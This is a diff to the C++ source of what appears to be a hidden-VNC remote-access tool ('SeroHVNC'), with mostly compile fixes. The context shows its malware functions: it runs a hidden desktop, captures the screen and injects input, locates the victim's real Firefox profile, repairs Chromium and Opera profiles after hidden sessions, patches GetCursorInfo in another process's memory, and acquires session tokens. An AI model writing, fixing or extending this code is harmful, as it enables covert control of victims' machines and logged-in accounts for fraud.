@@ -93,6 +93,8 @@ static int g_targetFps = 15;
 
 static HDESK g_hHiddenDesktop = NULL;
 static wstring g_desktopName = L"SeroHVNC";
+static int g_canvasW = 1920;
+static int g_canvasH = 1080;
 
 static mutex g_gdiplusMutex;
 static ULONG_PTR g_gdiplusToken = 0;
@@ -925,7 +927,7 @@ static void capture_loop() {
         }
 
         // Draw cursor
-        HCURSOR hArrow = LoadCursorW(NULL, IDC_ARROW);
+        HCURSOR hArrow = LoadCursorW(NULL, (LPCWSTR)32512); // IDC_ARROW = 32512
         if (hArrow && g_curX >= 0 && g_curY >= 0 && g_curX < sw && g_curY < sh) {
             int cx = (g_curX * scale) / 100;
             int cy = (g_curY * scale) / 100;
@@ -991,9 +993,6 @@ static wstring VkToChars(int vk) {
 }
 
 static HWND SmartWindowFromPoint(POINT pt) {
-    const int GWL_EXSTYLE = -20;
-    const int WS_EX_TRANSPARENT = 0x00000020;
-
     for (int attempt = 0; attempt < 4; attempt++) {
         HWND hwnd = WindowFromPoint(pt);
         if (!hwnd) return NULL;
@@ -1019,8 +1018,6 @@ static bool IsTaskbar(HWND hwnd) {
 static bool IsContextMenuOrPopup(HWND prevRoot, HWND root) {
     if (!root) return false;
     if (WinClass(root) == "#32768") return true;
-    const int GWL_STYLE = -16;
-    const uint32_t WS_POPUP = 0x80000000;
     bool isPopup = ((uint32_t)GetWindowLongW(root, GWL_STYLE) & WS_POPUP) != 0;
     if (!isPopup) return false;
     if (!prevRoot) return false;
@@ -1079,8 +1076,6 @@ static int RefineNCHit(int hit, HWND root, int x, int y) {
     return HTCAPTION;
 }
 
-static HBITMAP GetCursor() { return NULL; } // dummy
-
 static void HandleMouseMove(int x, int y) {
     g_curX = x; g_curY = y;
     SetCursorPos(x, y);
@@ -1132,8 +1127,8 @@ static void HandleMouseButton(int x, int y, int button, bool down) {
     }
 
     if (button == 0) {
-        LPARAM lpHit = MAKELPARAM(x, y);
-        int hit = RefineNCHit(SafeNCHitTest(hwnd, lpHit), root, x, y);
+        LPARAM lParam = MAKELPARAM(x, y);
+        int hit = RefineNCHit(SafeNCHitTest(hwnd, lParam), root, x, y);
 
         if (hit != 0 && hit != HTCLIENT) {
             if (down && hit == HTCAPTION) {
@@ -1435,7 +1430,7 @@ static wstring GetFirefoxRealProfile() {
         }
     };
 
-    std::wifstream f(iniPath);
+    std::wifstream f(iniPath.c_str());
     if (f.is_open()) {
         wstring line;
         while (std::getline(f, line)) {
@@ -1471,7 +1466,7 @@ static wstring GetFirefoxRealProfile() {
 static void RepairChromiumJsonFile(const fs::path& path) {
     if (!fs::exists(path)) return;
     try {
-        std::ifstream f(path);
+        std::ifstream f(path.wstring().c_str());
         if (!f.is_open()) return;
         std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
         f.close();
@@ -1588,10 +1583,6 @@ static void RepairOperaProfileAfterHvnc() {
 // -------------------------------------------------------------------------
 
 static bool PatchCursorInfo(DWORD pid) {
-    const uint32_t PROCESS_VM_WRITE = 0x0020;
-    const uint32_t PROCESS_VM_OPERATION = 0x0008;
-    const uint32_t PAGE_EXECUTE_READWRITE = 0x40;
-
     HMODULE user32 = GetModuleHandleW(L"user32.dll");
     if (!user32) return false;
     FARPROC addr = GetProcAddress(user32, "GetCursorInfo");
@@ -1752,10 +1743,7 @@ static void KillProcessByName(const string& exeName) {
     CloseHandle(snap);
 }
 
-typedef BOOL(WINAPI* pfnWTSQueryUserToken)(ULONG SessionId, PHANDLE phToken);
-
 static HANDLE GetLaunchToken() {
-    const DWORD TOKEN_ALL_ACCESS = 0xF01FF;
     const DWORD PROCESS_QUERY_LIMITED = 0x1000;
 
     DWORD session = WTSGetActiveConsoleSessionId();
